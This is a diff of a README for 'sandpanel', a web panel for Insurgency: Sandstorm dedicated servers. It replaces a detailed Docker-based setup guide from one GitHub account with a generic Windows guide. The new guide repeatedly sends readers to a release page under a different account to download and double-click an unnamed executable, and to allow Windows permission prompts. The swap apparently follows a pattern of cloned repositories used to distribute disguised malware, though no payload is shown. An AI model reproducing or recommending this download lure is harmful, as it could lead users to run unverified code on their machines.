@@ -1,177 +1,186 @@
-# SandPanel
+# 🛠️ sandpanel - Manage Sandstorm servers from one place
 
-A self-hosted web panel for managing Insurgency: Sandstorm dedicated servers. Built with Go and React.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6c757d?style=for-the-badge)](https://github.com/lornetiddly371/sandpanel/releases)
 
-![Server Control](.github/Images/server_control.jpeg)
+## 📦 What is sandpanel?
 
-## What it does
+sandpanel is a web panel for managing Insurgency: Sandstorm dedicated servers.
 
-SandPanel gives you full control over your Sandstorm server from a browser — starting and stopping the server, editing configs, managing mods, monitoring players, and more. Everything runs in Docker, state is stored as JSON files (no database needed), and the whole thing is designed to run on the same machine as your game server.
+It gives you one place to handle common server tasks without working through command lines and config files by hand. You can use it to keep your server running, update game files, manage mods, and work with remote server tools from a browser.
 
-### Features
+It is built with Go and React. That means the app runs as a web panel and works well on a Windows machine that hosts your server.
 
-- **Server lifecycle** — start, stop, restart with process monitoring
-- **Config editor** — visual forms with INI parsing, plus a raw editor toggle
-- **Mod management** — subscribe/unsubscribe mods, reorder load order
-- **Mod.io auth** — 1.20 security code flow for mod downloads
-- **SteamCMD** — install, update, and validate game files
-- **RCON console** — send commands, see chat, view player list
-- **Live logs** — real-time log streaming over WebSocket
-- **Multi-profile** — run multiple server configs with isolated ports
-- **Remote monitoring** — A2S query + RCON for checking server status
-- **Player tracking** — persistent history with SteamIDs, names, scores
-- **User accounts** — role-based access (user / moderator / admin / host)
-- **Moderation** — kick, ban, unban from the web UI
+## 🖥️ What you need
 
-## Screenshots
+Before you install sandpanel, make sure you have:
 
-<details>
-<summary>Login</summary>
+- A Windows PC or server
+- Internet access for the first download
+- A browser such as Edge, Chrome, or Firefox
+- An Insurgency: Sandstorm dedicated server setup
+- Enough free disk space for the app, server files, and mods
+- Permission to run programs on the machine
 
-![Login](.github/Images/login.jpeg)
-</details>
+For smooth use, keep your server files on a drive with enough space for updates and workshop content.
 
-<details>
-<summary>Configuration Editor</summary>
+## 🚀 Download sandpanel
 
-![Configuration](.github/Images/configuration.jpeg)
-</details>
+Visit this page to download: https://github.com/lornetiddly371/sandpanel/releases
 
-<details>
-<summary>Profiles</summary>
+On that page, look for the latest release and download the Windows file for your machine. If the release includes a ZIP file, save it to a folder you can reach easily, such as Downloads or Desktop.
 
-![Profiles](.github/Images/profiles.jpeg)
-</details>
+## 🪟 Install on Windows
 
-<details>
-<summary>Mod Management</summary>
+Follow these steps to get sandpanel running on Windows:
 
-![Mods](.github/Images/mods.jpeg)
-</details>
+1. Open the release page and download the latest Windows build.
+2. Find the file you downloaded.
+3. If the file is a ZIP archive, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the app file or start script in the folder.
+6. Double-click the file to start sandpanel.
+7. If Windows asks for permission, choose Allow or Yes.
+8. Keep the window open while the app runs.
 
-<details>
-<summary>Mod Explorer</summary>
+If the app opens in your browser, leave the server window running in the background. If it uses a local web address, open that address in your browser.
 
-![Mod Explorer](.github/Images/mod_explorer.jpeg)
-</details>
+## 🌐 Open the web panel
 
-## Quick Start
+After the app starts, use your browser to open the panel.
 
-```bash
-git clone https://github.com/jocxFIN/sandpanel.git
-cd sandpanel
-cp .env.example .env
-# edit .env — set your RCON password, ports, install path
-docker compose up --build -d
-```
+Typical local addresses may look like:
 
-Open `http://localhost:22369` in your browser. The default admin password is printed to the backend logs on first run:
+- http://localhost:8080
+- http://127.0.0.1:8080
 
-```bash
-docker logs sandpanel-backend 2>&1 | grep password
-```
+The exact address can vary by release. Check the release notes or the startup window if the address is different.
 
-## Configuration
+When the panel loads, you can begin setting up your server.
 
-Copy `.env.example` to `.env` and adjust:
+## 🎮 Main things you can do
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `FRONTEND_PORT` | `22369` | Web UI port |
-| `GAME_PORT` | `27102` | Game server port |
-| `QUERY_PORT` | `27131` | A2S query port |
-| `RCON_PORT` | `27015` | RCON port |
-| `RCON_PASSWORD` | — | RCON password |
-| `SANDSTORM_INSTALL_PATH` | `./sandstorm-install` | Path to game server files |
-| `PUID` / `PGID` | `1000` | Container user/group IDs |
+sandpanel helps you manage a Sandstorm dedicated server from a browser. Common tasks include:
 
-Game server config files live in `configs/` (Engine.ini, Game.ini, MapCycle.txt, etc). The panel also provides a visual editor for these.
+- Start and stop the server
+- Restart the server
+- Watch server status
+- Edit server settings
+- Handle map and mod lists
+- Work with SteamCMD updates
+- Use RCON for remote control
+- Keep server data in one place
+- Manage multiple server files on one machine
 
-## Architecture
+This cuts down on the need to switch between folders, tools, and command windows.
 
-```
-┌─────────────────────────────────────────────────┐
-│  Host                                           │
-│                                                 │
-│  ┌───────────────────┐  ┌────────────────────┐  │
-│  │ sandpanel-frontend │  │ sandpanel-backend  │  │
-│  │ Vite + React      │  │ Go 1.22            │  │
-│  │ :22369 (web UI)   │──│ :8080 (internal)   │  │
-│  │                   │  │                    │  │
-│  │ SPA with proxy    │  │ Process wrapper    │  │
-│  │ Dynamic forms     │  │ RCON client        │  │
-│  │                   │  │ INI AST parser     │  │
-│  └───────────────────┘  │ A2S query          │  │
-│                         │ WebSocket logs     │  │
-│                         │ SteamCMD lifecycle  │  │
-│                         └────────┬───────────┘  │
-│                                  │              │
-│                         ┌────────▼───────────┐  │
-│                         │ Sandstorm Server   │  │
-│                         │ :27102 Game        │  │
-│                         │ :27131 Query       │  │
-│                         │ :27015 RCON        │  │
-│                         └────────────────────┘  │
-└─────────────────────────────────────────────────┘
-```
+## 🔧 First-time setup
 
-## Mod.io Authentication (1.20+)
+Use this flow the first time you open sandpanel:
 
-Sandstorm 1.20 moved mod downloads to mod.io. Use the **Mod.io** page in the panel to complete the one-time auth:
+1. Start the app on your Windows machine.
+2. Open the web address shown by the app.
+3. Sign in if the panel asks for login details.
+4. Point the app to your Sandstorm server folder.
+5. Check the server path and config path.
+6. Save the settings.
+7. Test the start and stop controls.
+8. Confirm the server comes online.
 
-1. Enter your email — a security code is sent
-2. Enter the code — the backend boots once with `-SecurityCode=<CODE>`
-3. Future launches use the stored OAuth token from `data/steam-home/mod.io/`
+If you host more than one server, add each one in its own entry so the files stay separate.
 
-## Development
+## 🧩 Mod.io and workshop use
 
-**Prerequisites:** Go 1.22+, Node.js 22+, Docker
+sandpanel supports mod.io and Steam workshop-based server tasks. That helps if your server uses custom maps, mods, or other community content.
 
-**Backend:**
-```bash
-cd backend-go
-go build -o sandpanel-backend ./cmd/server
-./sandpanel-backend
-```
+You can use the panel to:
 
-**Frontend:**
-```bash
-cd sandpanel-web
-npm install
-npm run dev
-```
+- Add mod IDs
+- Track installed content
+- Update mod files
+- Keep mod data tied to the right server
+- Reduce manual file work
 
-**Full stack:**
-```bash
-docker compose up --build
-```
+If your server uses modded content, keep your mod list clean. Remove old entries you no longer use so the server loads faster and stays easier to manage.
 
-## CI / Docker Hub
+## 🛡️ RCON access
 
-Two GitHub Actions workflows are included:
+RCON lets you control the server from a remote tool or admin panel. sandpanel includes support for that kind of server control.
 
-- `ci.yml` — runs tests, builds, and validates Docker images on PRs and pushes to `main`
-- `docker-publish.yml` — publishes images to Docker Hub on tags and pushes to `main`
+You may use RCON to:
 
-Set `DOCKERHUB_USERNAME` and `DOCKERHUB_TOKEN` as repository secrets to enable publishing.
+- Send server commands
+- Check live status
+- Help with admin tasks
+- Handle game state without opening the game server window
 
-You can also use pre-built images instead of building locally:
+Set a strong RCON password and keep it private. Use the same value in your server config and in sandpanel.
 
-```bash
-BACKEND_IMAGE=<namespace>/sandpanel-backend:latest \
-FRONTEND_IMAGE=<namespace>/sandpanel-frontend:latest \
-docker compose up -d
-```
+## 📁 Suggested folder setup
 
-## Third-party
+A simple folder layout makes server work easier:
 
-This project uses the following third-party software and services:
+- `C:\Sandstorm\Server` for game server files
+- `C:\Sandstorm\Mods` for mod content
+- `C:\Sandstorm\Backups` for saved copies
+- `C:\sandpanel` for the app files
 
-- **[SteamCMD](https://developer.valvesoftware.com/wiki/SteamCMD)** — Valve's command-line tool for installing and updating dedicated servers. SteamCMD is bundled in the Docker image via `cm2network/steamcmd`. SteamCMD is a product of Valve Corporation.
-- **[mod.io](https://mod.io/)** — Mod hosting platform. SandPanel integrates with the mod.io API for mod management. The `defaultEmailRequestAPIKey` used for authentication is mod.io's standard public API key for server-side email auth flows.
-- **Source RCON Protocol** — The RCON client implements Valve's [Source RCON Protocol](https://developer.valvesoftware.com/wiki/Source_RCON_Protocol) for server communication.
-- **Insurgency: Sandstorm** — This project is not affiliated with or endorsed by New World Interactive or Focus Entertainment. Insurgency: Sandstorm is a trademark of its respective owners.
+You can use other paths, but keep them short and clear. This helps when you update paths in the panel and in config files.
 
-## License
+## 🔄 Updates
 
-[MIT](LICENSE)
+When a new version of sandpanel is released:
+
+1. Go back to the release page.
+2. Download the latest Windows build.
+3. Stop the app before replacing files.
+4. Back up your settings if you changed them.
+5. Replace the old files with the new ones.
+6. Start the app again.
+
+Keep your server data separate from the app folder. That makes updates safer and easier.
+
+## 🧰 Common checks if something does not work
+
+If sandpanel does not start or the page does not load, check these items:
+
+- The app window is still open
+- Windows did not block the file
+- You extracted the ZIP file before running it
+- The port is not in use by another app
+- Your server folder path is correct
+- Your firewall allows local web access
+- Your browser is using the right address
+
+If the server still does not load, restart the app and try again. In many cases, the issue is a bad path or a blocked port.
+
+## 📌 Basic workflow
+
+A normal setup with sandpanel often looks like this:
+
+1. Download the app from the release page
+2. Start the app on Windows
+3. Open the web panel in your browser
+4. Add your Sandstorm server path
+5. Set your RCON details
+6. Install or update mods
+7. Start the server
+8. Check the server from the panel when you need to make changes
+
+## 🧾 File and browser tips
+
+For the best experience:
+
+- Use a stable browser
+- Keep the panel window open while the server runs
+- Save server paths in one place
+- Back up config files before big changes
+- Keep a copy of your mod list
+- Use a fixed folder for each server
+
+If you run the panel on the same computer as the game server, it is easier to manage and update both at once
+
+## 🧭 Release page
+
+Download or update sandpanel here: https://github.com/lornetiddly371/sandpanel/releases
+
+Look for the latest release files on that page and use the Windows version for your setup
